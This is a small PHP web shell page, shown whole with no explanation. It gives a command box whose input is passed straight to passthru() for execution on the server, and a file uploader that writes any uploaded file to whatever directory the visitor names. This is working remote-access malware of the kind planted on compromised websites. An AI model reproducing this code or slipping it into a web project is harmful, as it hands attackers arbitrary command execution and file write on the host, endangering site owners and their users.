<html>
<head>
<div align="left"><font size="1">Input command :</font></div>
<form name="cmd" method="POST" enctype="multipart/form-data">
<input type="text" name="cmd" size="30" class="input"><br>
<pre>
<?php
if ($_POST['cmd']){
$cmd = $_POST['cmd'];
passthru($cmd);
}
?>
</pre>
<hr>
<div align="left"><font size="1">Uploader file :</font></div>

<?php
$uploaded = $_FILES['file']['tmp_name'];
if (file_exists($uploaded)) {
   $pwddir = $_POST['dir'];
   $real = $_FILES['file']['name'];
   $dez = $pwddir."/".$real;
   copy($uploaded, $dez);
   echo "FILE UPLOADED TO $dez";
}
?>     </pre>
<form name="form1" method="post" enctype="multipart/form-data">
 <input type="text" name="dir" size="30" value="<? passthru("pwd"); ?>">
 <input type="submit" name="submit2" value="Upload">
 <input type="file" name="file" size="15">
	  </td>
    </tr>
</table>
</body>
</html>
